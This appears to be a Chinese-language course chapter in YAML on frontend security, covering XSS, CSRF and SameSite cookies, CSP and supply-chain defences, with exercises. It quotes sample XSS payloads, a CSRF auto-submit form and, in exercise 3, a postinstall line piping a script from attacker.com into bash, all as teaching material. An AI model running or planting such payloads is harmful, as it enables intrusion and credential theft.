learning_targets:
- 理解 XSS 攻击的三大分类（存储型、反射型、DOM-based）成因及防御核心：上下文感知的输出编码
- 掌握 HTML/Attribute/JS/URL/CSS 五大编码上下文的差异与对应转义策略，会用 DOMPurify 与 Trusted Types 实施白名单清洗
- 理解 CSRF 攻击原理与 SameSite Cookie（Strict/Lax/None）的防御边界，能实现双重提交令牌模式作为兜底
- 掌握 CSP 3 核心指令（nonce、strict-dynamic、report-uri）配置方法，能制定灰度上线策略并处理第三方脚本兼容
- 建立前端供应链安全意识：会接入依赖审计、锁文件版本固化、恶意包行为检测与 SBOM 生成的 CI/CD 门禁
- 能产出《前端安全开发规范》《安全编码 Checklist》《漏洞分级与响应流程》，接入 SDL 全生命周期管理体系
concept_map:
- 前端安全体系 (第 9 章)
- ├── XSS 攻防全景
- │   ├── 三大分类：存储型 / 反射型 / DOM-based  —— P001
- │   ├── 五大编码上下文：HTML / Attribute / JS / URL / CSS  —— P001
- │   ├── 核心防御：输出编码 / DOMPurify 白名单 / Trusted Types 强制类型  —— P001
- │   └── 纵深兜底：CSP 策略 / HttpOnly Cookie  —— P001, P003
- ├── CSRF 与 SameSite Cookie
- │   ├── 攻击链路：自动携带 Cookie 的跨站请求伪造  —— P002
- │   ├── SameSite 属性：Strict / Lax(默认) / None+Secure  —— P002
- │   ├── 双重提交令牌：Cookie/Header 同步校验模式  —— P002
- │   └── 边界：子域共享 Cookie 失效 / 无状态 JWT 免疫  —— P002
- ├── 内容安全策略 (CSP)
- │   ├── 核心指令：script-src / style-src / connect-src / default-src 等  —— P003
- │   ├── 现代模式：nonce-<base64> + 'strict-dynamic'  —— P003
- │   ├── 部署策略：Report-Only 灰度 -> 强制模式 + report-uri 上报  —— P003
- │   └── 兼容处理：哈希值回退 / 第三方脚本白名单 / 托管代理  —— P003
- ├── 供应链安全
- │   ├── 依赖审计：npm/pnpm/yarn audit + CI 门禁阈值  —— P004
- │   ├── 锁文件完整性：package-lock.json / pnpm-lock.yaml 哈希锁定  —— P004
- │   ├── 恶意包检测：Socket / Snyk / OSSF Scorecard 静态行为分析  —— P004
- │   └── SBOM 生成：CycloneDX / SPDX 格式 @cyclonedx/bom / syft  —— P004
- └── 安全基线与应急 SOP
- '    ├── 三大清单：接入清单 / 编码清单 / 发布清单  —— P005, P109, P110'
- '    ├── 自动化门禁：Husky 提交拦截 / CI 漏洞阻断 / CD 签名校验  —— P005, P109'
- '    ├── 监控告警：CSP 违规上报 / JS 异常激增 / 埋点异常 -> IM 告警  —— P005, P109'
- '    └── SDL 落地：需求评审 / 设计评审 / 编码规范 / 测试验收 / 发布上线 / 运维响应  —— P005, P109, P110'
life_analogy:
- 想象前端安全是一个**多层安检的机场航站楼**：
- '- **XSS 防御 = 登机口安检（输出编码/Trusted Types）**：'
- '  - 乘客(数据)在进入登机区(HTML/JS/CSS 执行上下文)前，必须通过金属探测门(上下文感知编码)，携带违禁品(脚本标签/事件处理器)直接拦截'
- '  - VIP 通道(富文本/合法 HTML)需人工复核白名单(DOMPurify)，不能凭脸通关(正则自造)'
- '- **CSRF 防御 = 登机牌+身份证双证核验（SameSite + CSRF Token）**：'
- '  - SameSite=Lax 就像国内航班只验登机牌(同站请求自动带 Cookie)，国际航班(跨站 POST/AJAX)必须额外查护照(CSRF Token)'
- '  - SameSite=None 就像过境免签，虽方便但必须加装 GPS 追踪器(双重令牌)防止劫持'
- '- **CSP = 机场禁飞区与白名单机制**：'
- '  - 明确规定只有持有当日动态通行证(nonce)的飞机(内联脚本)能起降，且只能按批准航线(strict-dynamic)飞行'
- '  - 闯入者(内联事件/外部恶意脚本)直接被防空导弹(浏览器拦截)击落，并上报空管中心(report-uri)'
- '- **供应链安全 = 行李传送带全程 X 光+封条（依赖审计+锁文件+SBOM）**：'
- '  - 每件行李(依赖包)入场必扫描已知威胁库(advisory DB)，可疑行为(网络请求/混淆代码)直接剔除'
- '  - 给每件行李加防拆封条(lockfile 哈希)，目的地核对清单(SBOM)防止掉包'
- '- **安全基线与 SOP = 机场标准化运行手册与应急预案**：'
- '  - 每日例检(CI 门禁)、突发事件分级响应(P0 停航/P1 备降/P2 记录)、事后复盘更新手册(RCA)'
- '  - 新航线(新业务/新技术栈)开通前必须走审批流程，不可凭经验‘野蛮生长’'
summary:
- concept: XSS (跨站脚本攻击)
  desc: 恶意脚本注入受信网站，分存储型/反射型/DOM-based，核心防御是上下文感知输出编码
- concept: 五大编码上下文
  desc: HTML/Attribute/JS/URL/CSS 编码互不通用，必须匹配输出位置，OWASP 首选输出编码而非输入过滤
- concept: DOMPurify / Trusted Types
  desc: 富文本场景白名单清洗库 / W3C 标准强制敏感 DOM API 仅接受 TrustedHTML 类型，从类型系统根治 XSS
- concept: CSRF (跨站请求伪造)
  desc: 利用浏览器自动携带 Cookie 特性伪造用户操作，SameSite=Lax 可拦截 90%+ 跨站 POST/AJAX
- concept: SameSite Cookie
  desc: Strict(全禁)/Lax(默认,允许顶级 GET)/None+Secure(跨站需双重令牌)，子域共享时失效
- concept: 双重提交令牌
  desc: 后端生成 Token -> 前端读取回传 Header/Body -> 后端校验一致性，不依赖 SameSite 的兜底方案
- concept: CSP 3 (内容安全策略)
  desc: 通过 HTTP Header 显式声明合法代码来源，核心模式 `script-src 'nonce-xxx' 'strict-dynamic'` 彻底禁用内联脚本
- concept: CSP 部署策略
  desc: Report-Only 灰度收集违规 -> 修正误报 -> 切换强制模式，配合 report-uri 实时监控攻击
- concept: 供应链安全
  desc: 守住 node_modules 后门：依赖审计 + 锁文件哈希锁版 + 恶意包行为检测 + SBOM 物料清单合规交付
- concept: SBOM (软件物料清单)
  desc: 记录所有直接/间接依赖的名称、版本、哈希、许可证，格式 CycloneDX/SPDX，用于漏洞溯源与合规
- concept: 安全基线清单
  desc: 接入/编码/发布三大清单标准化，接入 SDL 全生命周期，CI/CD 自动化门禁阻断高危变更
- concept: 应急响应 SOP
  desc: P0/P1/P2 分级响应：溯源取证 -> 热修复/回滚 -> 事后 RCA 复盘 -> 补全规范与测试用例
exercises:
- 'no': 1
  title: XSS 上下文编码实战
  contents:
  - 场景：用户输入 `name` 将在以下 4 个位置渲染，请分别写出必须使用的编码函数或安全属性（伪代码即可）：
  - 1. `<div class="username">{{name}}</div>`  —— HTML 文本节点
  - 2. `<input value="{{name}}" />`  —— HTML 属性值 (双引号包裹)
  - 3. `<a href="/search?q={{name}}">搜索</a>`  —— URL 查询参数
  - 4. `<script>const user = '{{name}}';</script>`  —— JavaScript 字符串字面量
  - 回答问题：
  - '- 为什么不能统一用 `encodeURIComponent` 处理以上所有场景？'
  - '- 若第 3 处改为 `<a href="javascript:search(''{{name}}'')">`，编码策略需如何变更？'
  - '- React JSX / Vue 模板默认帮你做了哪些场景的转义？还有哪些『逃逸口』需手动处理？'
- 'no': 2
  title: CSP 策略调试与 nonce 注入
  contents:
  - 给定一个 Vue 3 + Vite 单页应用，需部署严格 CSP：仅允许同源脚本、样式、图片；允许连接 `https://api.example.com`；禁止内联脚本/样式、eval、object、frame；违规上报至
    `/csp-report`。
  - 任务：
  - 1. 写出完整的 `Content-Security-Policy` Header 值（使用 nonce + strict-dynamic 模式）。
  - 2. 说明 Vite 构建时如何自动给入口 `<script>` 与内联 `<style>` 注入 `nonce` 属性（提示：`vite-plugin-csp-nonce`
    或 `html-webpack-plugin` 思路）。
  - 3. 第三方统计脚本 `https://hm.baidu.com/hm.js?xxx` 被 CSP 拦截，给出两种不降低安全等级的接入方案。
  - 回答问题：
  - '- 为何不推荐使用 `''sha256-...''` 哈希值替代 nonce？'
  - '- 如果老版本浏览器不支持 `strict-dynamic`，CSP 会如何降级？如何兼容？'
- 'no': 3
  title: 供应链安全 CI 门禁设计
  contents:
  - 某 Monorepo 项目 (pnpm workspace) 包含 3 个子包，现需在 GitHub Actions 中建立供应链安全门禁：
  - 任务：
  - 1. 编写工作流步骤：安装依赖 -> 审计生产依赖 (高危以上阻断) -> 运行 Socket/Snyk 扫描 PR 变更依赖 -> 生成 CycloneDX
    SBOM 上传为 Artifact。
  - 2. `pnpm audit` 报告 `lodash@4.17.15` 存在原型链污染漏洞 (GHSA-xxxx)，但业务方称『暂无升级计划』，作为安全负责人你会如何处理？给出决策流程。
  - 3. 新增依赖 `super-useful-lib@1.0.0`，其 `postinstall` 脚本包含 `curl http://attacker.com/steal.sh
    | bash`，说明 Socket 静态分析如何在安装前识别并拦截该行为。
  - 回答问题：
  - '- `npm audit` 与 Socket 检测能力的本质区别是什么？'
  - '- 为什么必须提交 `pnpm-lock.yaml` 到 Git？如果不提交会发生什么供应链风险？'
- 'no': 4
  title: CSRF 防御矩阵决策
  contents:
  - 某业务系统架构：主域 `app.example.com` (Cookie 认证)，子域 `api.example.com` (无状态 JWT Header
    认证)，第三方支付 `pay.thirdparty.com` (需在 iframe 中嵌入，跨域 Cookie)。
  - 请为每个场景选择最佳 CSRF 防御组合并说明理由：
  - 1. `app.example.com` 内部的转账 POST 接口
  - 2. `api.example.com` 的删除资源 DELETE 接口
  - 3. `pay.thirdparty.com` 在 iframe 中发起的支付确认 POST 请求
  - 回答问题：
  - '- 为什么 `api.example.com` 用 JWT Header 天然免疫 CSRF？但引入了什么新风险？如何缓解？'
  - '- `pay.thirdparty.com` 必须设置 `SameSite=None; Secure`，此时 SameSite 失效，靠什么兜底？'
  - '- 如果 `app.example.com` 存在一个反射型 XSS，SameSite=Lax 和 CSRF Token 能否阻止攻击者发起转账？为什么？'
- 'no': 5
  title: 安全基线 Checklist 与应急演练
  contents:
  - 请为团队输出一份《前端安全编码 Checklist》（Markdown 表格形式），至少覆盖以下 5 类 15 条检查项：
  - '- XSS 防御 (编码、富文本、Trusted Types)'
  - '- CSRF 防御 (SameSite、Token、接口方法语义)'
  - '- CSP 与响应头 (CSP、HSTS、COOP/COEP、Referrer-Policy)'
  - '- 依赖与构建 (audit、lockfile、SBOM、Source Map 保护)'
  - '- 业务逻辑 (敏感操作二次确认、URL 跳转白名单、错误信息脱敏)'
  - ''
  - 附加任务：设计一次『XSS 注入触发 CSP 上报』的应急演练脚本，包含：
  - 1. 模拟攻击构造步骤
  - 2. 监控告警触发条件 (如 5 分钟内 CSP 违规 > 10 次)
  - 3. 现网定位与影响范围确认流程
  - 4. 热修复方案对比：收紧 CSP 规则 vs 前端代码回滚 vs WAF 拦截，决策矩阵是什么？
  - 5. 事后 RCA 模版关键字段
units:
- 'no': 1
  name: XSS 攻防全景 —— 从输入过滤到输出编码的纵深防御
  points:
  - '**为什么需要这个概念？**'
  - '- Web 应用核心交互是“数据输入 -> 处理 -> 数据输出”，若输出环节未对不可信数据进行编码，浏览器会将其当作代码执行'
  - '- 攻击者注入恶意脚本可窃取 Cookie、劫持会话、篡改页面、发起钓鱼，危害直达用户隐私与资金安全'
  - '- 现代前端框架虽提供默认转义，但 `dangerouslySetInnerHTML`、`v-html`、URL 拼接、CSS 注入等“逃逸口”极易被误用'
  - '**核心定义**'
  - '- XSS（跨站脚本攻击）：攻击者将恶意脚本注入被信任网站，受害者浏览器加载页面时执行攻击脚本'
  - '- 按注入持久化路径分：存储型（入库再渲染）、反射型（URL 参数直接渲染）、DOM-based（纯前端 JS 解析 URL/数据动态渲染）'
  - '**关键性质**'
  - '- 编码上下文决定防御策略：HTML 实体编码、属性编码、JavaScript 编码、URL 编码、CSS 编码**互不通用**，必须匹配输出位置'
  - '- 输入过滤/白名单只能作辅助，**输出编码/上下文感知转义**是核心防线（OWASP 首选）'
  - '- Trusted Types (W3C 标准) 强制要求敏感 DOM API（如 `innerHTML`）只接受 `TrustedHTML` 类型对象，从根源杜绝字符串拼接注入'
  - '**典型例子**'
  - '- 反射型：搜索页 `q=<script>alert(1)</script>` 直接拼接到 `<div>搜索结果: {q}</div>`'
  - '- 存储型：评论区提交 `<img src=x onerror=stealCookie()>`，所有访问者中招'
  - '- DOM-based：`document.getElementById(''content'').innerHTML = location.hash.slice(1)`
    无编码渲染 hash'
  - '- 防御实战：React 默认 JSX 转义；Vue `v-html` 需配合 DOMPurify 白名单清洗；原生 JS 必须用 `element.textContent`
    而非 `innerHTML`'
  - '**边界条件**'
  - '- 富文本编辑器、Markdown 渲染、模板引擎等“合法 HTML 场景”必须引入 DOMPurify 等成熟库做白名单清洗，不可自造正则'
  - '- CSP (Content-Security-Policy) 是纵深防御兜底，非替代品；`script-src ''self''` 可阻断内联脚本与外域加载，但需配合
    nonce/hash 支持内联'
  - '- `HttpOnly` Cookie 可防窃取，但无法阻止 `fetch` 发起带凭证请求（CSRF 风险仍在）'
  - '...'
  sources:
  - paper: 20230418_042.md
    role: origin
  excerpts:
  - 区分 HTML/Attribute/JS/URL/CSS 五大编码上下文，实战 DOMPurify 白名单清洗、Trusted Types 强制安全类型赋值。
- 'no': 2
  name: CSRF 与 SameSite Cookie —— 同源策略演进下的“令牌双保险”
  points:
  - '**为什么需要这个概念？**'
  - '- 浏览器自动携带 Cookie 的特性导致：用户登录 A 站 -> 访问恶意 B 站 -> B 站自动发起对 A 站的请求（带上 Cookie）-> A
    站误以为是用户自主操作'
  - '- 传统防御依赖 `Referer` 检查或同步令牌模式（表单隐藏字段 + Session 校验），但 `Referer` 可被篡改/隐私模式丢失，同步令牌需后端改造且易漏掉接口'
  - '**核心定义**'
  - '- CSRF（跨站请求伪造）：利用受害者已认证身份，在不知情情况下强制发起状态改变请求（转账、改密、发帖）'
  - '- SameSite Cookie 属性：`Strict`（完全禁止跨站携带）、`Lax`（允许链接/GET 表单跨站携带，默认行为）、`None`（跨站携带，需
    `Secure`）'
  - '**关键性质**'
  - '- SameSite=Lax 是现代浏览器默认值，可拦截 90%+ CSRF（POST 表单、AJAX、iframe 跨站均不带 Cookie），但**无法防御**站内
    XSS 发起的请求、顶级导航 GET 请求'
  - '- 双重提交令牌模式：后端生成 Token -> 前端读取 Cookie/Header -> 请求头/体同时携带 -> 后端校验一致性，防御不依赖 SameSite，兼容旧浏览器'
  - '- `SameSite=None; Secure` 用于跨域嵌入场景（如第三方支付、SSO），必须配合 CSRF Token 双重防护'
  - '**典型例子**'
  - '- 恶意页面：`<form action=''https://bank.com/transfer'' method=''POST''><input name=''amount''
    value=''10000''></form><script>document.forms[0].submit()</script>`'
  - '- SameSite=Lax 下上述表单提交**不携带 Cookie**，请求未认证，防御生效'
  - '- 但若银行提供 `GET /transfer?to=attacker&amount=10000`，Lax 允许顶级导航携带 Cookie，**CSRF
    依然生效**（需强制状态改变用 POST + Token）'
  - '**边界条件**'
  - '- 子域名共享 Cookie（`Domain=.example.com`）时，SameSite 视为同站，**无法防御**子域名 XSS 发起的 CSRF'
  - '- 无状态架构（JWT 在 Header 而非 Cookie）天然免疫 CSRF，但面临 XSS 窃取 Token 风险，需配合短过期 + 刷新机制'
  - '- 旧版浏览器不支持 SameSite，必须保留 CSRF Token 兜底'
  - '...'
  sources:
  - paper: 20230418_042.md
    role: origin
  excerpts:
  - 演示 CSRF 攻击链路，对比 `SameSite` 属性在跨站请求中的拦截效果，实现基于 Header 的双重提交令牌模式。
- 'no': 3
  name: 内容安全策略 (CSP) —— 给浏览器加把“执行锁”
  points:
  - '**为什么需要这个概念？**'
  - '- XSS 根因是“浏览器无法区分开发者代码与攻击者注入代码”，CSP 通过 HTTP Header 显式声明“合法代码来源”，将执行权限收回开发者手中'
  - '- 即使存在 XSS 漏洞，严格 CSP 也能阻断恶意脚本执行、阻止数据外泄（`connect-src`）、禁止内联脚本/样式，将损失降至最低'
  - '**核心定义**'
  - '- CSP 3 核心指令：`default-src`（兜底）、`script-src`（脚本）、`style-src`（样式）、`img-src`（图片）、`connect-src`（AJAX/WebSocket）、`font-src`、`object-src`、`frame-src`、`base-uri`、`form-action`
    等'
  - '- 关键机制：`nonce-<base64>`（每次响应生成随机值，内联脚本需带相同 nonce）、`''strict-dynamic''`（信任受信脚本动态加载的后续脚本）、`''unsafe-inline''`/`''unsafe-eval''`（强烈禁用）'
  - '**关键性质**'
  - '- 部署策略：`Content-Security-Policy-Report-Only` 灰度观察违规报告 -> 修正误报 -> 切换 `Content-Security-Policy`
    强制模式'
  - '- `report-uri` / `report-to` 指定违规上报端点，配合日志分析平台实时发现攻击尝试'
  - '- `script-src ''nonce-xxx'' ''strict-dynamic''` 是现代单页应用推荐模式：仅允许带 nonce 的入口脚本及其信任链执行，彻底禁用内联事件处理器'
  - '**典型例子**'
  - '- 严格 CSP 示例：`Content-Security-Policy: default-src ''self''; script-src ''nonce-rAnd0m123''
    ''strict-dynamic''; style-src ''self'' ''nonce-rAnd0m123''; img-src ''self'' data:;
    connect-src ''self'' https://api.example.com; frame-ancestors ''none''; base-uri
    ''self''; form-action ''self''; report-uri /csp-report`'
  - '- Vue/React 构建产物自动注入 nonce 需配合 `html-webpack-plugin` / `vite-plugin-csp-nonce`
    等工具链支持'
  - '**边界条件**'
  - '- 旧版浏览器不支持 `strict-dynamic`/`nonce`，需回退兼容方案（哈希值 `sha256-...`）'
  - '- 第三方脚本（统计、广告、聊天插件）需显式加入白名单或托管到自域名代理，否则会被拦截导致业务功能失效'
  - '- CSP **无法防御**存储型 XSS 导致的 HTML 结构破坏（如注入 `<a href="phishing.com">登录</a>` 钓鱼链接），需配合输出编码'
  - '...'
  sources:
